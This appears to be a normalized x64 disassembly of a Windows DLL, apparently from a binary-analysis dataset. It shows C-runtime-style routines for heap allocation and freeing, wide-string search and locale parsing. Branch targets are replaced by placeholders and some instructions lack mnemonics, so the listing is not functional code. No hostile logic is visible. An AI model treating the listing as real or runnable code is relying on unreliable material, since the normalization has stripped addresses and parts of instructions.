cmp [ rdx ] r11w
jne r-xdata
movzx eax [ rcx ]
cmp ax r11w
je r-xdata
mov rax rcx
retn
xor eax eax
retn
mov r9 rcx
sub r9 rdx
cmp [ rdx ] r11w
je r-xdata
cmp [ rdx ] r11w
je r-xdata
mov rax r8
retn
add r8 0x2
add r9 0x2
mov ax [ r8 ]
cmp ax r11w
jne r-xdata
movzx ecx [ r9 + rdx ]
movzx eax [ rdx ]
cmp ecx eax
jne r-xdata
mov rdx r10
cmp ax r11w
je r-xdata
add rdx 0x2
cmp [ r9 + rdx ] r11w
jne r-xdata
sub_18000e06c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_180010834
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800107ec
mov [ rbx ] eax
sub_18000e0ac
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_1800134e0
call sub_180010834
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_180014cf4
mov ecx 0x1e
call sub_180014acc
mov ecx 0xff
call sub_180011144
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_180010834
mov [ rax ] 0xc
mov rcx rbx
call sub_1800134e0
test eax eax
je r-xdata
call sub_180010834
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_18000e164
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x60
mov r11 r9
mov r10 r8
mov rbx rcx
test r8 r8
jne r-xdata
test rdx rdx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov [ rsp + 0x48 ] 0x42
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x30 ] rcx
cmp rdx 0x3fffffff
jbe r-xdata
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x60
pop rdi
retn
lea eax [ rdx + rdx ]
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x38 ] 0x7fffffff
jmp r-xdata
sub [ rsp + 0x38 ] 0x1
js r-xdata
mov r9 [ rsp + 0x90 ]
lea rcx [ rsp + 0x30 ]
mov r8 r11
mov rdx r10
call sub_18000fb24
mov edi eax
test rbx rbx
je r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov rax [ rsp + 0x30 ]
mov rax [ rsp + 0x30 ]
mov [ rax ] 0x0
mov rax [ rsp + 0x30 ]
inc rax
mov [ rsp + 0x30 ] rax
jmp r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov [ rax ] 0x0
jmp r-xdata
sub [ rsp + 0x38 ] 0x1
js r-xdata
mov eax edi
sub_18000e268
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_18000e06c
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_18000e06c
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_18000e06c
mov rcx [ rbx + 0x130 ]
call sub_18000e06c
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_18001536c
mov rcx [ rbx + 0x158 ]
call sub_18000e06c
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
sub rsi 0x1
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18000e06c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x110 ]
call sub_18000e06c
mov rcx [ rbx + 0x128 ]
call sub_18000e06c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x128 ]
call sub_180015848
call sub_18000e06c
call sub_18000e06c
mov rcx [ rbx + 0x128 ]
call sub_1800155f4
sub_18000e3e4
[ rcx ] 0x1
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] 0x1
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] 0x1
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] 0x1
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] 0x1
retn
[ rdx ] 0x1
sub_18000e47c
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_18000e524
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_18000e3e4
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_18000e47c
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_18000e268
sub_18000e57c
push rbx
sub rsp 0x20
call sub_180010a54
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_180016624
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_18000e524
mov rbx rax
mov ecx 0xc
call sub_180016524
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_1800110d8
call sub_180010a54
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_18000e5f4
test r8d r8d
jle r-xdata
retn
mov [ rsp + 0x18 ] r8d
mov [ rsp + 0x20 ] r9
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
lea rdi [ rsp + 0x78 ]
xor ebx ebx
mov rsi rdx
add rdi 0xfffffffffffffff8
mov rbp rcx
inc ebx
cmp ebx [ rsp + 0x70 ]
jl r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
add rdi 0x8
mov rdx rsi
mov rcx rbp
mov r8 [ rdi ]
call sub_180016668
test eax eax
je r-xdata
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
sub_18000e658
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov rbx rdx
mov r8d 0x90
xor edx edx
mov rsi rcx
call sub_180016870
cmp [ rbx ] 0x0
jne r-xdata
cmp [ rbx ] 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
xor ebp ebp
jmp r-xdata
lea r8 [ rbx + 0x1 ]
cmp [ r8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
lea rdx [ r--data ]
mov rcx rbx
call sub_1800166f4
test rax rax
jne r-xdata
mov edx 0x10
lea rcx [ rsi + 0x80 ]
lea r9d [ rdx - 0x1 ]
call sub_180016788
test eax eax
je r-xdata
lea r12 [ rax + rbx ]
mov dil [ r12 ]
test ebp ebp
jne r-xdata
or eax 0xffffffff
mov [ rsi + 0x8f ] 0x0
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
cmp ebp 0x1
jne r-xdata
cmp rax 0x40
jae r-xdata
cmp ebp 0x2
jne r-xdata
cmp rax 0x40
jae r-xdata
cmp dil 0x2e
je r-xdata
cmp rax 0x10
jae r-xdata
cmp dil 0x5f
je r-xdata
lea edx [ rbp + 0x40 ]
mov rcx rsi
jmp r-xdata
test dil dil
je r-xdata
lea rcx [ rsi + 0x40 ]
lea edx [ rbp + 0x3f ]
jmp r-xdata
mov r9 rax
mov r8 rbx
call sub_180016788
test eax eax
je r-xdata
lea rcx [ rsi + 0x80 ]
mov edx 0x10
cmp dil 0x2c
jne r-xdata
cmp dil 0x2c
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
test dil dil
je r-xdata
lea rbx [ r12 + 0x1 ]
inc ebp
sub_18000e7c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx r8
mov rdi rdx
mov rsi rcx
call sub_18001695c
test eax eax
je r-xdata
lea rax [ rbx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
lea rax [ rbx + 0x80 ]
cmp [ rax ] 0x0
je r-xdata
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_18000e5f4
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_18000e5f4
sub_18000e858
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rbx rcx
mov r12d 0x1
mov ecx 0x355
mov edi r12d
call sub_1800114a4
mov rsi rax
mov [ rsp + 0x80 ] rax
xor eax eax
cmp rsi rax
je r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rbp [ rsi + 0x4 ]
lea r13 [ rbx + 0x68 ]
lea r8d [ r12 + 0x2 ]
mov [ rbp ] al
mov [ rsi ] r12d
mov rax [ r13 ]
mov r9 [ r--data ]
mov [ rsp + 0x28 ] rax
lea rax [ r--data ]
mov edx 0x351
mov rcx rbp
mov [ rsp + 0x20 ] rax
call sub_18000e5f4
mov r15 r12
lea r12 [ rbx + 0x88 ]
lea r14 [ r--data ]
xor esi esi
mov rdx [ r12 ]
mov rcx [ r13 ]
call sub_1800132b0
mov edx 0x351
mov r8d 0x3
cmp eax esi
mov rcx rbp
cmovne edi esi
inc r15
add r14 0x18
mov r9 [ r14 ]
mov rax r15
add r12 0x20
shl rax 0x5
lea r13 [ rax + rbx + 0x48 ]
mov rax [ r13 ]
mov [ rsp + 0x28 ] rax
lea rax [ r--data ]
mov [ rsp + 0x20 ] rax
call sub_18000e5f4
lea r11 [ r--data ]
cmp r14 r11
jl r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18001063c
lea r8 [ r--data ]
mov edx 0x351
mov rcx rbp
call sub_180016668
cmp eax esi
je r-xdata
mov rsi [ rsp + 0x80 ]
xor r13d r13d
cmp edi r13d
jne r-xdata
mov rcx rsi
call sub_18000e06c
mov rcx [ rbx + 0x58 ]
or edi 0xffffffff
cmp rcx r13
je r-xdata
mov rcx [ rbx + 0x58 ]
or edi 0xffffffff
cmp rcx r13
je r-xdata
mov rdx [ rbx + 0x60 ]
cmp rdx r13
je r-xdata
mov eax edi
[ rcx ] eax
add eax edi
jne r-xdata
mov rdx [ rbx + 0x60 ]
cmp rdx r13
je r-xdata
mov eax edi
[ rcx ] eax
add eax edi
jne r-xdata
mov rax [ rbx + 0x88 ]
mov [ rbx + 0x58 ] r13
mov [ rbx + 0x48 ] r13
mov ecx edi
[ rdx ] ecx
add ecx edi
jne r-xdata
mov rcx [ rbx + 0x58 ]
call sub_18000e06c
mov [ rbx + 0x58 ] rsi
mov [ rbx + 0x48 ] rbp
mov rax rbp
jmp r-xdata
mov ecx edi
[ rdx ] ecx
add ecx edi
jne r-xdata
mov rcx [ rbx + 0x58 ]
call sub_18000e06c
mov rcx [ rbx + 0x60 ]
call sub_18000e06c
mov [ rbx + 0x50 ] r13
mov [ rbx + 0x60 ] r13
mov rcx [ rbx + 0x60 ]
call sub_18000e06c
sub_18000ea40
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rsi [ rsp + 0x160 ]
mov rdi r9
mov r15 r8
mov rbp rdx
mov rbx rcx
call sub_180010a54
lea rcx [ rax + 0x170 ]
lea r14 [ rax + 0x168 ]
xor r12d r12d
mov [ rsp + 0x40 ] rcx
lea rcx [ rax + 0x174 ]
mov [ rsp + 0x30 ] r14
lea r13 [ rax + 0x1f7 ]
mov [ rsp + 0x38 ] rcx
cmp rbx r12
je r-xdata
xor eax eax
cmp rbp r12
je r-xdata
cmp r15 r12
je r-xdata
cmp [ rbx ] 0x43
jne r-xdata
mov rcx rbx
call sub_1800174b0
mov r12 rax
cmp rax 0x83
jae r-xdata
cmp [ rbx + 0x1 ] r12b
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov rdx rbx
xor r14d r14d
call sub_18000e658
test eax eax
jne r-xdata
mov rdx rbx
mov rcx r13
call sub_1800132b0
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r15
mov rcx rbp
call sub_18001695c
cmp eax r12d
je r-xdata
mov rdx [ rsp + 0x30 ]
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x50 ]
call sub_180017230
test eax eax
je r-xdata
test rdi rdi
je r-xdata
mov rcx [ rsp + 0x38 ]
mov rdx rbx
call sub_1800132b0
test eax eax
je r-xdata
cmp rdi r12
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_18001063c
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x40 ]
lea r8 [ rsp + 0x50 ]
movzx eax [ rax + 0x4 ]
mov edx 0x83
mov [ rcx ] eax
mov rcx r13
call sub_18000e7c0
cmp [ rbx ] r14b
je r-xdata
test rsi rsi
je r-xdata
mov r8d 0x6
mov rdx r14
mov rcx rdi
call sub_1800160e0
cmp rsi r12
je r-xdata
mov [ rdi ] r12w
mov [ rdi + 0x2 ] r12w
mov [ rdi + 0x4 ] r12w
lea rbx [ r--data ]
cmp r12 0x83
jae r-xdata
mov r8 r13
mov rdx r15
mov rcx rbp
call sub_18001695c
test eax eax
je r-xdata
mov rdx [ rsp + 0x40 ]
mov r8d 0x4
mov rcx rsi
call sub_1800160e0
mov rax rbp
jmp r-xdata
mov [ rsi ] r12d
mov r14 [ rsp + 0x30 ]
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
mov r14 r12
jmp r-xdata
mov rax r13
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_180017570
add rsp 0xf8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rsp + 0x38 ]
lea r9 [ r14 + 0x1 ]
mov r8 rbx
mov edx 0x83
call sub_180016788
test eax eax
je r-xdata
sub_18000ec80
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x210
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x200 ] rax
mov rbx r8
movsxd r15 edx
mov rdi rcx
call sub_180010a54
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x70 ]
mov rsi rax
lea rax [ rsp + 0x40 ]
mov r8d 0x83
mov rcx rbx
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] rax
call sub_18000ea40
test rax rax
jne r-xdata
mov rbx r15
lea rcx [ rsp + 0x70 ]
shl rbx 0x5
mov rdx [ rbx + rdi + 0x48 ]
call sub_1800132b0
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov rax [ rbx + rdi + 0x48 ]
lea rcx [ rsp + 0x70 ]
call sub_1800174b0
mov rbp rax
lea rcx [ rax + 0x5 ]
call sub_1800114a4
mov r12 rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x200 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x268 ]
add rsp 0x210
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rax [ rbx + rdi + 0x48 ]
lea r13 [ r15 + 0x3 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x58 ] rax
mov eax [ rdi + r13 * 4 ]
mov r8d 0x6
mov [ rsp + 0x50 ] eax
lea rax [ r15 + r15 * 2 + 0x12 ]
lea rax [ rdi + rax * 2 ]
mov rdx rax
mov [ rsp + 0x60 ] rax
call sub_1800160e0
mov eax [ rdi + 0x4 ]
lea rdx [ rbp + 0x1 ]
lea r8 [ rsp + 0x70 ]
lea rcx [ r12 + 0x4 ]
mov [ rsp + 0x44 ] eax
call sub_18001695c
test eax eax
je r-xdata
mov rcx [ rsp + 0x60 ]
lea rax [ r12 + 0x4 ]
lea rdx [ rsp + 0x48 ]
mov [ rbx + rdi + 0x48 ] rax
movzx eax [ rsp + 0x48 ]
mov r8d 0x6
mov [ rdi + r13 * 4 ] eax
call sub_1800160e0
cmp r15d 0x2
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
cmp r15d 0x1
jne r-xdata
mov eax [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov [ rdi + 0x4 ] eax
mov rcx [ rsi + 0x29c ]
lea rax [ r15 + r15 * 2 ]
lea rdx [ r--data ]
mov rcx rdi
call [ rdx + rax * 8 ]
test eax eax
mov rax [ rsp + 0x58 ]
je r-xdata
mov eax [ rsp + 0x40 ]
mov [ rdi + 0x8 ] eax
test r8d r8d
je r-xdata
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + rdx * 8 + 0x27c ] rcx
inc rdx
inc r8d
cmp rdx 0x5
mov rcx rax
jl r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx r12
mov [ rbx + rdi + 0x48 ] rax
call sub_18000e06c
mov r11d [ rsp + 0x50 ]
mov eax [ rsp + 0x44 ]
mov [ rdi + r13 * 4 ] r11d
mov [ rdi + 0x4 ] eax
jmp r-xdata
cmp r8d 0x5
jne r-xdata
movsxd rdx r8d
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + 0x27c ] rax
mov [ rsi + rdx * 8 + 0x27c ] rcx
mov eax [ rsi + rdx * 8 + 0x27c ]
cmp [ rdi + 0x4 ] eax
je r-xdata
jmp r-xdata
mov [ r12 ] 0x1
mov [ rbx + rdi + 0x58 ] r12
mov rdx [ rbx + rdi + 0x58 ]
[ rdx ] 0xffffffff
jne r-xdata
mov eax [ rsi + 0x280 ]
mov [ rdi + 0x108 ] eax
mov eax [ rdi + 0x14 ]
lea ebp [ r8 + 0x7a ]
mov [ rsp + 0x38 ] 0x1
mov [ rsp + 0x30 ] eax
mov eax [ rdi + 0x4 ]
lea r8 [ r--data ]
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x100 ]
lea edx [ rbp - 0x7e ]
mov r9d ebp
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_1800178d4
test eax eax
je r-xdata
mov rcx [ rbx + rdi + 0x58 ]
call sub_18000e06c
shl r13 0x5
mov rcx [ r13 + rdi ]
call sub_18000e06c
and [ rbx + rdi + 0x50 ] 0x0
and [ rsi + 0x280 ] 0x0
lea rax [ rsp + 0x100 ]
mov ecx 0x1ff
and [ rax ] cx
add rax 0x2
sub rbp 0x1
jne r-xdata
mov rdx [ rw-data ]
lea rcx [ rsp + 0x100 ]
mov r8d 0xfe
call sub_1800175a0
xor ecx ecx
test eax eax
sete cl
mov [ rsi + 0x280 ] ecx
jmp r-xdata
mov eax [ rdi + 0x4 ]
mov [ rsi + 0x27c ] eax
sub_18000ef88
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov rbx r8
mov rdi rcx
test edx edx
je r-xdata
xor esi esi
lea r12d [ rsi + 0x1 ]
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
call sub_18000e858
cmp [ r8 ] 0x4c
jne r-xdata
movsxd rax edx
shl rax 0x5
mov rax [ rax + rcx + 0x48 ]
jmp r-xdata
call sub_18000ec80
jmp r-xdata
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
lea rdx [ rsp + 0x30 ]
xor r9d r9d
mov r8d 0x83
mov rcx rbx
call sub_18000ea40
test rax rax
je r-xdata
cmp [ r8 + 0x1 ] 0x43
jne r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_180017570
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor ebx ebx
lea rbp [ rdi + 0x48 ]
cmp [ r8 + 0x2 ] 0x5f
jne r-xdata
inc ebx
add rbp 0x20
cmp ebx 0x5
jle r-xdata
mov rdx [ rbp ]
lea rcx [ rsp + 0x30 ]
call sub_1800132b0
test eax eax
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_180017a28
mov rbp rax
test rax rax
je r-xdata
test ebx ebx
je r-xdata
test r12d r12d
jne r-xdata
inc esi
lea r8 [ rsp + 0x30 ]
mov edx ebx
mov rcx rdi
call sub_18000ec80
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov r13 rax
sub r13 rbx
je r-xdata
mov rcx rdi
jmp r-xdata
xor r12d r12d
jmp r-xdata
cmp [ rax ] 0x3b
je r-xdata
test esi esi
je r-xdata
mov r14d 0x1
lea r12 [ r--data ]
lea rax [ r--data ]
add r12 0x18
inc r14d
cmp r12 rax
jle r-xdata
mov rcx [ r12 ]
call sub_1800174b0
cmp r13 rax
je r-xdata
mov rcx [ r12 ]
mov r8 r13
mov rdx rbx
call sub_180017970
test eax eax
jne r-xdata
inc rbp
lea rdx [ r--data ]
mov rcx rbp
call sub_1800166f4
mov rbx rax
test rax rax
jne r-xdata
cmp r14d 0x5
jg r-xdata
cmp [ rbp ] 0x3b
jne r-xdata
add rbx rbp
cmp [ rbx ] 0x0
je r-xdata
lea rcx [ rsp + 0x30 ]
mov r9 rax
mov r8 rbp
mov edx 0x83
call sub_180016788
test eax eax
je r-xdata
inc rbx
cmp [ rbx ] 0x0
jne r-xdata
lea r8 [ rsp + 0x30 ]
mov edx r14d
mov rcx rdi
mov [ rsp + rbx + 0x30 ] 0x0
call sub_18000ec80
test rax rax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
inc esi
sub_18000f1ac
mov [ rsp + 0x8 ] rsi
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x40
mov r13 rdx
mov r14d ecx
xor r12d r12d
cmp ecx 0x5
jbe r-xdata
call sub_180010a54
mov rsi rax
mov [ rsp + 0x70 ] rax
call sub_18000e57c
or [ rsi + 0xc8 ] 0x10
mov edx 0x1
mov ecx 0x160
call sub_180011510
mov rdi rax
test rax rax
je r-xdata
call sub_180010834
mov [ rax ] 0x16
and [ rsp + 0x20 ] r12
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
xor eax eax
jmp r-xdata
and [ rsi + 0xc8 ] 0xffffffef
mov rax r12
mov ecx 0xc
call sub_180016624
nop
mov rdx [ rsi + 0xc0 ]
test rdx rdx
je r-xdata
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
retn
mov ecx 0xc
call sub_180016524
mov r8 r13
mov edx r14d
mov rcx rdi
call sub_18000ef88
mov r12 rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
cmp rdi rdx
je r-xdata
mov rcx rdi
call sub_18000e47c
call sub_18000e268
nop
test r13 r13
je r-xdata
mov rcx rdi
mov r8d 0x160
call sub_1800160e0
and [ rdi ] 0x0
mov rcx rdi
call sub_18000e3e4
nop
mov r13d 0x1
lea rdx [ rw-data ]
mov rcx r13
call sub_1800132b0
mov ecx [ rw-data ]
test eax eax
mov r13d 0x1
cmovne ecx r13d
mov [ rw-data ] ecx
jmp r-xdata
mov ecx 0xc
call sub_180016524
jmp r-xdata
test [ rw-data ] r13b
jne r-xdata
mov ecx 0xc
call sub_180016624
nop
mov rdx rdi
lea rcx [ rsi + 0xc0 ]
call sub_18000e524
mov rcx rdi
call sub_18000e47c
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rdx [ rsi + 0xc0 ]
lea rcx [ rw-data ]
call sub_18000e524
mov rdx [ rw-data ]
add rdx 0xc
mov r8d 0x18
lea rcx [ rw-data ]
call sub_1800160e0
mov r11 [ rw-data ]
mov eax [ r11 + 0x4 ]
mov [ rw-data ] eax
mov eax [ r11 + 0x8 ]
mov [ rw-data ] eax
mov eax [ r11 + 0x108 ]
mov [ rw-data ] eax
mov rax [ r11 + 0x158 ]
mov [ rw-data ] rax
mov rax [ r11 + 0x128 ]
mov [ rw-data ] rax
mov rax [ r11 + 0x140 ]
mov [ rw-data ] rax
mov eax [ r11 + 0x10c ]
mov [ rw-data ] eax
sub_18000f3cc
jmp r-xdata
movzx eax [ rcx ]
test ax ax
jne r-xdata
cmp ax dx
je r-xdata
cmp ax dx
jne r-xdata
mov rax rcx
retn
add rcx 0x2
xor eax eax
retn
sub_18000f3ec
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x50
xor r12d r12d
mov rbp r8
mov rsi rdx
mov rdi rcx
mov eax r12d
cmp r8 r12
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x50
pop r12
retn
cmp rcx r12
jne r-xdata
cmp rdx r12
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
mov [ rax ] 0x16
call sub_180010764
mov eax 0x7fffffff
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov rdx r9
call sub_18000d428
mov r11 [ rsp + 0x30 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_180012440
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
mov bx ax
call sub_180012440
add rdi 0x2
add rsi 0x2
sub rbp 0x1
je r-xdata
